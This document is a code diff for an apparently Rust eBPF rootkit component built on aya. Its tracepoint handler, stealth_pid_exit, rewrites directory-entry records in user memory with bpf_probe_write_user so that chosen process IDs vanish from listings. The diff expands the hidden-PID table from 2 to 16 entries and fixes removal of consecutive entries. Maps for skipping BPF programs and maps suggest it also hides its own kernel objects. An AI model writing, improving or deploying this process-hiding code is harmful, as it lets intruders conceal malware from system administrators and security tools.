@@ -5,14 +5,14 @@ use aya_ebpf::{
     bindings::{bpf_attr, bpf_cmd},
     cty::c_void,
     helpers::{
-        bpf_get_current_comm, bpf_get_current_pid_tgid, bpf_loop, bpf_probe_read,
-        bpf_probe_read_user, bpf_probe_read_user_str_bytes, bpf_probe_write_user,
+        bpf_get_current_pid_tgid, bpf_loop, bpf_probe_read, bpf_probe_read_user,
+        bpf_probe_read_user_str_bytes, bpf_probe_write_user,
     },
     macros::{map, tracepoint},
     maps::{Array, HashMap, Queue},
     programs::TracePointContext,
 };
-use aya_log_ebpf::{debug, error, info};
+use aya_log_ebpf::{debug, error};
 #[map]
 static PROG_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(32, 0);
 #[map]
@@ -21,7 +21,7 @@ static MAP_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(32, 0
 static HIDDEN_BPF_OBJ: HashMap<u32, [u32; 32]> = HashMap::<u32, [u32; 32]>::with_max_entries(2, 0);
 
 #[map]
-static HIDDEN_PIDS: Array<HiddenPid> = Array::with_max_entries(2, 0);
+static HIDDEN_PIDS: Array<HiddenPid> = Array::with_max_entries(16, 0);
 #[map]
 static PID_DIRENTS: HashMap<u32, u64> = HashMap::<u32, u64>::with_max_entries(32, 0);
 #[map]
@@ -139,38 +139,38 @@ pub struct QueuedDirent {
 }
 
 #[repr(C)]
-struct DirentData<'a> {
+struct DirentIteratorData<'a> {
     ctx: &'a TracePointContext,
     bpos: u64,
     max_offset: u64,
     dirents_buf_addr: u64,
     d_reclen: u16,
     d_reclen_prev: u16,
-    patch_succeded: bool,
 }
 
-fn remove_curr_dirent(ctx: &mut DirentData) -> Result<(), i64> {
-    let d_reclen_new = (ctx.d_reclen + ctx.d_reclen_prev) as u16;
+fn remove_curr_dirent(ctx: &mut DirentIteratorData) -> Result<(), i64> {
+    let d_reclen_new = ctx.d_reclen + ctx.d_reclen_prev;
+
     let _ = unsafe {
         bpf_probe_write_user(
             (ctx.dirents_buf_addr + ctx.bpos - ctx.d_reclen_prev as u64 + 16u64) as *mut u16,
             &d_reclen_new as *const u16,
         )?
     };
-    ctx.patch_succeded = true;
+
     Ok(())
 }
 
 #[inline]
-fn patch_dirent_if_found(idx: u32, ctx: &mut DirentData) -> i64 {
+fn patch_dirent_if_found(idx: u32, ctx: &mut DirentIteratorData) -> i64 {
     if idx >= MAX_DIRENTS {
         debug!(ctx.ctx, "{}>{}", idx, MAX_DIRENTS);
         return 1;
     }
-    if ctx.patch_succeded {
-        info!(ctx.ctx, "already patched!");
-        return 1;
-    }
+    // if ctx.patch_succeded {
+    //     info!(ctx.ctx, "already patched!");
+    //     return 1;
+    // }
     if ctx.bpos >= ctx.max_offset {
         debug!(ctx.ctx, "({}) maxoffset {} exceeded", idx, ctx.max_offset);
         return 1;
@@ -212,39 +212,42 @@ fn patch_dirent_if_found(idx: u32, ctx: &mut DirentData) -> i64 {
             //     )
             //     .unwrap();
 
-            for i in 0..2 {
-                match HIDDEN_PIDS.get(i) {
-                    Some(hidden_pid) => {
-                        if {
-                            let mut found = true;
-                            for j in 0..parsed_pid.len() {
-                                if hidden_pid.bytes[j] != parsed_pid[j] {
-                                    found = false;
-                                    break;
-                                }
+            let mut found = false;
+            for i in 0..16 {
+                if let Some(hidden_pid) = HIDDEN_PIDS.get(i) {
+                    if {
+                        let mut found = true;
+                        for j in 0..parsed_pid.len() {
+                            if hidden_pid.bytes[j] != parsed_pid[j] {
+                                found = false;
+                                break;
                             }
-                            found
-                        } && hidden_pid.len == parsed_pid.len()
-                        {
-                            info!(ctx.ctx, "FOUND IT!!");
-                            if let Err(_) = remove_curr_dirent(ctx) {
-                                error!(ctx.ctx, "Error in patching");
-                            } else {
-                                info!(ctx.ctx, "PATCHED!!");
-                            }
+                        }
+                        found
+                    } && hidden_pid.len == parsed_pid.len()
+                    {
+                        debug!(ctx.ctx, "FOUND IT!! @{} #map {}  ", idx, i,);
+                        if remove_curr_dirent(ctx).is_err() {
+                            error!(ctx.ctx, "Error in patching");
                             return 1;
                         }
+                        found = true;
+                        break;
                     }
-                    _ => {}
                 }
             }
             ctx.bpos += dirent.d_reclen as u64;
-            ctx.d_reclen_prev = dirent.d_reclen;
+            if !found {
+                ctx.d_reclen_prev = dirent.d_reclen;
+            } else {
+                // patch succeded: now we update in dirent iterator  d_reclen_prev
+                ctx.d_reclen_prev += dirent.d_reclen;
+            }
         }
         0
     } else {
-        info!(ctx.ctx, "dirent entry {} not found:(", idx);
-        return 1;
+        debug!(ctx.ctx, "dirent entry {} not found:(", idx);
+        1
     }
 }
 
@@ -265,21 +268,20 @@ pub fn stealth_pid_exit(ctx: TracePointContext) -> Result<u32, u32> {
     let max_offset = unsafe { ctx.read_at::<u64>(16).map_err(|_| 1u32)? };
     debug!(&ctx, "max offset is: {}", max_offset);
     let dirents_buf_addr = *unsafe { PID_DIRENTS.get(&caller_pid) }.ok_or(1u32)?;
-    let mut dirent_data = DirentData {
+    let mut dirent_data = DirentIteratorData {
         ctx: &ctx,
         bpos: 0,
         max_offset,
         dirents_buf_addr,
         d_reclen: 0,
         d_reclen_prev: 0,
-        patch_succeded: false,
     };
 
     unsafe {
         bpf_loop(
             MAX_DIRENTS,
             patch_dirent_if_found as *mut fn(u64, *mut c_void) -> i64 as *mut c_void,
-            &mut dirent_data as *mut DirentData as *mut c_void,
+            &mut dirent_data as *mut DirentIteratorData as *mut c_void,
             0,
         )
     };
